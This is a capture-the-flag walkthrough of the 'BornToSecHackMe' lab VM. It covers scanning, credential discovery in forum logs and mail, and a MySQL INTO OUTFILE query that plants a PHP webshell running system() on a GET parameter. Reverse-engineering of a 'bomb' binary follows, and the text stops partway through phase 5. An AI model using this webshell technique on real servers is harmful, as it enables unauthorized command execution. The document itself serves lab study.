![[Pasted image 20240417170443.png]]
![[Pasted image 20240417170507.png]]
![[Pasted image 20240417170537.png]]






I launched the machine and made a scan on my local network:
```
┌──(fab㉿kali)-[~]
└─$ nmap 192.168.56.3/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 16:50 CEST
Nmap scan report for DESKTOP-D3V2624 (192.168.56.1)
Host is up (0.56s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 192.168.56.101
Host is up (0.0097s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 5.31 seconds

┌──(fab㉿kali)-[~]
└─$ sudo nmap -sU -sC -sV -Pn 192.168.56.101
[sudo] password for fab:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 16:49 CEST
Nmap scan report for 192.168.56.101
Host is up (0.0020s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1123.69 seconds

┌──(fab㉿kali)-[~]
└─$
```
and discovered this IP:
![[Pasted image 20240417165322.png]]
```
┌──(fab㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:09 CEST
Nmap scan report for 192.168.56.101
Host is up (0.0024s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2024-04-17T15:09:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: SASL-IR Pre-login more have LITERAL+ OK listed STARTTLS capabilities post-login LOGINDISABLEDA0001 IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: SASL-IR Pre-login more LITERAL+ have capabilities AUTH=PLAINA0001 listed post-login OK IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.27 seconds

┌──(fab㉿kali)-[~]
└─$ feroxbuster -u https://192.168.56.101 -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowerca
se.txt -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://192.168.56.101
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c https://192.168.56.101/forum => https://192.168.56.101/forum/
301      GET        9l       28w      323c https://192.168.56.101/phpmyadmin => https://192.168.56.101/phpmyadmin/
301      GET        9l       28w      320c https://192.168.56.101/webmail => https://192.168.56.101/webmail/
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      328c https://192.168.56.101/webmail/plugins => https://192.168.56.101/webmail/plugins/
301      GET        9l       28w      327c https://192.168.56.101/webmail/themes => https://192.168.56.101/webmail/themes/
301      GET        9l       28w      327c https://192.168.56.101/webmail/images => https://192.168.56.101/webmail/images/
301      GET        9l       28w      327c https://192.168.56.101/webmail/config => https://192.168.56.101/webmail/config/
301      GET        9l       28w      325c https://192.168.56.101/forum/images => https://192.168.56.101/forum/images/
301      GET        9l       28w      321c https://192.168.56.101/forum/js => https://192.168.56.101/forum/js/
301      GET        9l       28w      327c https://192.168.56.101/forum/includes => https://192.168.56.101/forum/includes/
301      GET        9l       28w      326c https://192.168.56.101/forum/modules => https://192.168.56.101/forum/modules/
301      GET        9l       28w      325c https://192.168.56.101/forum/themes => https://192.168.56.101/forum/themes/
200      GET        1l       90w     4450c https://192.168.56.101/forum/js/admin.min.js
200      GET        1l      191w    14244c https://192.168.56.101/forum/js/posting.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/rss.inc.php => ../index.php
200      GET      315l     1031w     9970c https://192.168.56.101/forum/js/admin.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/avatar.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/account_locked.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/js_defaults.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/register.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/main.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/auto_login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/user.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/contact.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/entry.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/posting.inc.php => ../index.php
200      GET        3l      321w    22481c https://192.168.56.101/forum/js/main.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/delete_cookie.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/index.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/disabled.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/insert_flash.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/upload_image.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/thread.inc.php => ../index.php
200      GET      812l     2589w    26535c https://192.168.56.101/forum/js/posting.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/functions.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/page.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/admin.inc.php => ../index.php
200      GET     1474l     4831w    45512c https://192.168.56.101/forum/js/main.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/search.inc.php => ../index.php
301      GET        9l       28w      342c https://192.168.56.101/webmail/plugins/administrator => https://192.168.56.101/webmail/plugins/administrator/
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/test => https://192.168.56.101/webmail/plugins/test/
301      GET        9l       28w      331c https://192.168.56.101/webmail/themes/css => https://192.168.56.101/webmail/themes/css/
301      GET        9l       28w      330c https://192.168.56.101/phpmyadmin/themes => https://192.168.56.101/phpmyadmin/themes/
301      GET        9l       28w      326c https://192.168.56.101/phpmyadmin/js => https://192.168.56.101/phpmyadmin/js/
200      GET        6l       15w      382c https://192.168.56.101/forum/images/smilies/biggrin.png
200      GET        4l       10w      325c https://192.168.56.101/forum/images/smilies/tongue.png
200      GET        4l       12w      303c https://192.168.56.101/forum/images/smilies/wink.png
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/smile.png
200      GET        3l        8w      292c https://192.168.56.101/forum/images/smilies/frown.png
200      GET        0l        0w        0c https://192.168.56.101/forum/includes/classes/Backup.class.php
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/neutral.png
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/akismet/akismet.class.php
200      GET        3l        6w      122c https://192.168.56.101/forum/modules/captcha/captcha_image.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser.class.php
200      GET       93l      281w     5742c https://192.168.56.101/forum/themes/default/main.tpl
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/bad-behavior/bad-behavior-generic.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/captcha/captcha.php
200      GET       22l       49w     1388c https://192.168.56.101/forum/themes/default/rss.tpl
200      GET        1l        6w       45c https://192.168.56.101/forum/modules/bad-behavior/index.html
200      GET       63l      262w     3176c https://192.168.56.101/forum/themes/default/insert_flash.tpl
200      GET        7l       16w      256c https://192.168.56.101/forum/themes/default/ajax_preview.tpl
200      GET      139l      506w     7201c https://192.168.56.101/forum/themes/default/upload_image.tpl
200      GET       87l      318w     4450c https://192.168.56.101/forum/themes/default/avatar.tpl
301      GET        9l       28w      323c https://192.168.56.101/forum/lang => https://192.168.56.101/forum/lang/
200      GET       21l       63w      955c https://192.168.56.101/forum/themes/default/js_config.ini
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser_bbcode.class.php
301      GET        9l       28w      330c https://192.168.56.101/forum/templates_c => https://192.168.56.101/forum/templates_c/
200      GET      403l     1325w    28929c https://192.168.56.101/forum/themes/default/style.min.css
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/geshi/geshi.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/smarty/Smarty.class.php
200      GET      600l     3494w    37414c https://192.168.56.101/forum/themes/default/style.css
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
200      GET     1106l     3513w    58607c https://192.168.56.101/forum/lang/chinese.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
200      GET        0l        0w        0c https://192.168.56.101/forum/templates_c/8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
200      GET     1105l     7187w    68480c https://192.168.56.101/forum/lang/spanish.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/demo => https://192.168.56.101/webmail/plugins/demo/
200      GET     1104l     6975w    69761c https://192.168.56.101/forum/lang/italian.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/info => https://192.168.56.101/webmail/plugins/info/
200      GET     1106l     6152w    68103c https://192.168.56.101/forum/lang/german.lang
200      GET     1114l     6827w    64755c https://192.168.56.101/forum/lang/english.lang
200      GET     1103l     6604w    66692c https://192.168.56.101/forum/lang/norwegian.lang
200      GET     1106l     7670w    73677c https://192.168.56.101/forum/lang/french.lang
200      GET     1115l     6226w    65855c https://192.168.56.101/forum/lang/swedish.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
200      GET     1104l     6396w    66784c https://192.168.56.101/forum/lang/croatian.lang
200      GET     1117l     6551w    96868c https://192.168.56.101/forum/lang/russian.lang
200      GET     1101l     6130w   123515c https://192.168.56.101/forum/lang/tamil.lang
301      GET        9l       28w      337c https://192.168.56.101/webmail/plugins/calendar => https://192.168.56.101/webmail/plugins/calendar/
200      GET     1109l     6168w    69500c https://192.168.56.101/forum/lang/turkish.lang
200      GET        1l        8w      374c https://192.168.56.101/forum/themes/default/images/favicon.ico
200      GET        3l        8w      245c https://192.168.56.101/forum/themes/default/images/complete_thread.png
200      GET       80l      371w     4935c https://192.168.56.101/forum/index
301      GET        9l       28w      325c https://192.168.56.101/forum/update => https://192.168.56.101/forum/update/
301      GET        9l       28w      324c https://192.168.56.101/webmail/src => https://192.168.56.101/webmail/src/
401      GET       14l       56w      482c https://192.168.56.101/phpmyadmin/setup
<SNIP>

┌──(fab㉿kali)-[~]
└─$
```
![[Pasted image 20240418113308.png]]
![[Pasted image 20240418100144.png]]
![[Pasted image 20240418113138.png]]

In the forum, by scrolling the ["Probleme login ?"](https://192.168.56.101/forum/index.php?id=6) room, we can see a user making many a connection attempt until they can log as "lmezard": 
![[Pasted image 20240418113422.png]]
![[Pasted image 20240418113755.png]]
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

With the following credentials:
```
lmezard
!q\]Ej?*5K5cy*AJ
```
I could accede to the forum:
![[Pasted image 20240418125614.png]]
If I explore the "Users" tab:
![[Pasted image 20240418135915.png]]
![[Pasted image 20240418135818.png]]
![[Pasted image 20240418135846.png]]

With the credentials:
```
laurie@borntosec.net
!q\]Ej?*5K5cy*AJ
```
we have access to the mail box:
![[Pasted image 20240422154048.png]]

Two mails awaited us, among which:
![[Pasted image 20240422154250.png]]

The credentials:
```
root
Fg-'kKXBj87E:aJ$
```
allow us to accede to the phpMyAdmin page:
![[Pasted image 20240422154638.png]]

We have then access to a database in which information about users is stored:
![[Pasted image 20240422160109.png]]

```
┌──(fab㉿kali)-[~]
└─$ cat forum
ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28
a12e059d6f4c21c6c5586283c8ecb2b65618ed0a0dc1b302a2
d30668b779542d60c4cde29e7170148198b1623f4453866797
f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed
0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90
f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c

┌──(fab㉿kali)-[~]
└─$
```

However, I can't identify the kind of hashing..

Usually MySQL5 Hash follows this pattern:
![[Pasted image 20240422164245.png]]
However, it doesn't seem to be the case now.

By following this [guide](https://medium.com/@959652664/summary-and-analysis-of-penetration-testing-based-on-phpmyadmin-784896851cf9), to make MySQL execute commands like the following one:
```
select "<html> <body> <form method='GET' name='<?php echo basename($_SERVER['PHP_SELF']); ?>'> <input type='TEXT' name='cmd' id='cmd' size='80'> <input type='SUBMIT' value='Execute'> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> <script>document.getElementById('cmd').focus();</script> </html>" into outfile "/var/www/forum/templates_c/test.php"
```
![[Pasted image 20240423142613.png]]

![[Pasted image 20240423142630.png]]

And we can find a webshell at [this address](https://192.168.56.101/forum/templates_c/test.php):
![[Pasted image 20240423142903.png]]

Typing:
```
cd /home/LOOKATME && cat password
lmezard:G!@M6f4Eatau{sF"

find / -perm -003 -type d 2>/dev/null # 4 for r, 2 for w, 1 for x
 /run/shm
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix
/var/crash
/var/lib/php5
/var/tmp
/var/www/forum/templates_c
/rofs
/rofs/tmp
/rofs/var/crash
/rofs/var/lib/php5
/rofs/var/tmp
/rofs/var/www/forum/templates_c

find / -user www-data 2>/dev/null
```

I think we have to follow the steps of the anonymous user that left a trail of bread crumbs...

Let's try to connect via FTP:
```
┌──(fab㉿kali)-[~]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53205|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||30922|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |***************************************************************************|    96      110.42 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (32.24 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||49751|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***************************************************************************|   790 KiB   14.42 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (14.10 MiB/s)
ftp>
```

We obtain two files:
```
┌──(fab㉿kali)-[~]
└─$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

┌──(fab㉿kali)-[~]
└─$ file fun
fun: POSIX tar archive (GNU)

┌──(fab㉿kali)-[~]
└─$ tar -xvf fun
<SNIP>

┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn main
BJPCP.pcap:572:int main() {
```
We find a `main()` function:
```
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12()); e
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```
we look for the function `getme1()` now:
```
┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn getme1
BJPCP.pcap:278:char getme10() {
BJPCP.pcap:379:char getme11() {
BJPCP.pcap:474:char getme12()
BJPCP.pcap:589: printf("%c",getme1());
BJPCP.pcap:598: printf("%c",getme10());
BJPCP.pcap:599: printf("%c",getme11());
BJPCP.pcap:600: printf("%c",getme12());
331ZU.pcap:1:char getme1() {

┌──(fab㉿kali)-[~/ft_fun]
└─$ cat 331ZU.pcap
char getme1() {

//file5

┌──(fab㉿kali)-[~/ft_fun]
└─$ grep -rn file6
<SNIP>
APM1E.pcap:3://file6
<SNIP>

┌──(fab㉿kali)-[~/ft_fun]
└─$ cat APM1E.pcap
        return 'I';

//file6

┌──(fab㉿kali)-[~/ft_fun]
└─$
```

And so on. Starting from `getme8()` the letters are in clear text.

Until we have:
```
┌──(fab㉿kali)-[~/ft_fun]
└─$ echo -n Iheartpwnage > password

┌──(fab㉿kali)-[~/ft_fun]
└─$ sha256sum password
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  password

┌──(fab㉿kali)-[~/ft_fun]
└─$
```
Our credentials are:
```
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

And we can connect via SSH:
```
┌──(fab㉿kali)-[~]
└─$ ssh laurie@192.168.56.101
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password:
laurie@BornToSecHackMe:~$ ls -la
total 34
drwxr-x--- 3 laurie   laurie   143 Oct 15  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
P

BOOM!!!
The bomb has blown up.
laurie@BornToSecHackMe:~$
```

### The Bomb

I transfer the file to my session to analyze it:
```
┌──(fab㉿kali)-[~/ft_fun]
└─$ scp laurie@192.168.56.101:~/bomb ./
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password:
bomb                                                                                    100%   26KB   2.9MB/s   00:00

┌──(fab㉿kali)-[~/ft_fun]
└─$ ghidra
```

It seems that we have to pass six tests: 
```
int main(int argc,char **argv)
{
  char *pcVar1;
  int in_stack_00000004;
  char **in_stack_00000008;
  
  if (in_stack_00000004 == 1) {
    infile = stdin;
  }
  else {
    if (in_stack_00000004 != 2) {
      printf("Usage: %s [<input_file>]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
    infile = (_IO_FILE *)fopen(in_stack_00000008[1],"r");
    if ((FILE *)infile == (FILE *)0x0) {
      printf("%s: Error: Couldn\'t open %s\n",*in_stack_00000008,in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
  }
  initialize_bomb();
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  pcVar1 = read_line();
  phase_1(pcVar1);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  pcVar1 = read_line();
  phase_2(pcVar1);
  phase_defused();
  printf("That\'s number 2.  Keep going!\n");
  pcVar1 = read_line();
  phase_3(pcVar1);
  phase_defused();
  printf("Halfway there!\n");
  pcVar1 = read_line();
  phase_4(pcVar1);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  pcVar1 = read_line();
  phase_5(pcVar1);
  phase_defused();
  printf("Good work!  On to the next...\n");
  pcVar1 = read_line();
  phase_6(pcVar1);
  phase_defused();
  return 0;
}
```

The first test simply asks us to enter a string:
```
void phase_1(char *param_1)
{
  int iVar1;
  
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

The program uses the function `readline()` to retrieve ou string.

This time we have to enter a string with 7 numbers in increasing order and respecting a certain condition:
```
stack[1] must be equal to 1
iVar1 = 1;
stack[2] must be equal to 2 * stack[1] // 2
iVar1 = 2
stack[3] must be equal to 3 * stack[2] // 6
iVar1 = 3
stack[4] must be equal to 4 * stack[3] // 24
iVar1 = 4
stack[5] must be equal to 5 * stack[4] // 120
iVar1 = 5
stack[6] must be equal to 6 * stack[5] // 720

1 2 6 24 120 720
```

Our string will be parsed by a [`sscanf()`](https://linux.die.net/man/3/sscanf):
```
void read_six_numbers(char *param_1,int param_2)
{
  int iVar1;
  
  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",(int *)param_2,(int *)(param_2 + 4),
                 (int *)(param_2 + 8),(int *)(param_2 + 0xc),(int *)(param_2 + 0x10),
                 (int *)(param_2 + 0x14));
  if (iVar1 < 6) {
    explode_bomb();
  }
  return;
}

void phase_2(char *param_1)
{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,(int)(aiStack_20 + 1));
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

For the following test I typed "0 q 777":
```
void phase_3(char *param_1)
{
  int iVar1;
  uchar uVar2;
  uint local_10;
  uchar local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",(int *)&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    uVar2 = 'q';
    if (local_8 != 0x309) { // 777
      explode_bomb();
    }
    break;
  case 1:
    uVar2 = 'b';
    if (local_8 != 0xd6) { // 214
      explode_bomb();
    }
    break;
  case 2:
    uVar2 = 'b';
    if (local_8 != 0x2f3) { // 755
      explode_bomb();
    }
    break;
  case 3:
    uVar2 = 'k';
    if (local_8 != 0xfb) { // 251
      explode_bomb();
    }
    break;
  case 4:
    uVar2 = 'o';
    if (local_8 != 0xa0) { // 160
      explode_bomb();
    }
    break;
  case 5:
    uVar2 = 't';
    if (local_8 != 0x1ca) { // 458
      explode_bomb();
    }
    break;
  case 6:
    uVar2 = 'v';
    if (local_8 != 0x30c) { // 780
      explode_bomb();
    }
    break;
  case 7:
    uVar2 = 'b';
    if (local_8 != 0x20c) { // 524
      explode_bomb();
    }
    break;
  default:
    uVar2 = 'x';
    explode_bomb();
  }
  if (uVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

For the next test, `iVar1` should be equal to 55 after the operation.
For the record, `sscanf()` returns the number of matches found and assigned:
```
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) { // 55
    explode_bomb();
  }
  return;
}
```

I tested with a program coded for this purpose:
```
┌──(fab㉿kali)-[~]
└─$ ./a.out 9
1 9
win!55

┌──(fab㉿kali)-[~]
└─$ ┌──(fab㉿kali)-[~]
└─$ cat gatto.c
#include <stdio.h>

int func4(int param_1)
{
  int iVar1;
  int iVar2;

  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}


int main(int ac, char *av[]) {
        if (ac != 2)
                return 1;
        char *n = av[1];
        int local;
        int var = sscanf(n, "%d", &local);
        printf("%d %d\n", var, local);

        var = func4(local);
        if (var == 55) { // 55
           printf("win!");
         }
        printf("%d\n", var);
}

┌──(fab㉿kali)-[~]
└─$
```

Next we have to enter a six-character string of numbers on each character of which a [bitwise AND](https://en.wikipedia.org/wiki/Bitwise_operation) is applied the result of which should give the position of each letter of the word "giants" in this alphabet:
![[Pasted image 20240423193825.png]]
so:
```
char array.123[16] = "isrveawhobpnutfg";
g -> 15
i -> 0
a -> 5
n -> 11
t -> 13
s -> 1
```

The result of the AND operation is converted to a `char` before being used to dereference the array:
```
void phase_5(char *param_1)
{
  int iVar1;
